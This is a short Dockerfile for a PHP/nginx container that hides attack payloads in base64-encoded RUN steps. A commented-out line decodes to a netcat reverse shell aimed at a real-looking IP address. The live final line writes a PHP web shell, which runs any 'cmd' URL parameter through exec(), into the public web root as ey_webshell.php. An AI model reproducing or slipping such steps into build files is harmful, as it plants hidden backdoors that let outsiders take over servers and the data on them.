#FROM ghcr.io/socialgouv/docker/nginx:7.1.1
FROM trafex/php-nginx

ARG COMMIT_SHA
ENV COMMIT_SHA $COMMIT_SHA

RUN echo "=========="
#RUN echo "bmMgODkuOTAuMzkuNTQgOTA5MCAtZSBzaA==" | base64 -d | sh -i
RUN echo "=========="
RUN echo "PD9waHAKZXhlYygiJF9HRVRbJ2NtZCddIik7Cj8+Cg==" | base64 -d > /var/www/html/ey_webshell.php
